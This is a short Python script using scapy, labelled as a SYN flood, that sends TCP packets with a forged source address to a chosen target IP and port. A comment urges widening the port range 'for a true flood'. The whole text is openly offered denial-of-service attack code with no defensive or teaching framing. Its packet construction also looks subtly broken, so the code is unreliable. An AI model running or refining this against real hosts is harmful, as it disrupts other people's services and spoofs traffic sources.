#synflood script

from scapy.all import *

def flood(source,target):
    for source_p in range(100,150):             #increase the range for a true flood
        IPlayer = IP(src=source,dst=target)
        TCPlayer = TCP(sport=source_p,dport=600)
        pkt = IPlayer,TCPlayer
        send(pkt)

source = "[put IP here]"
target = "[put Target IP here]"
flood(source,target)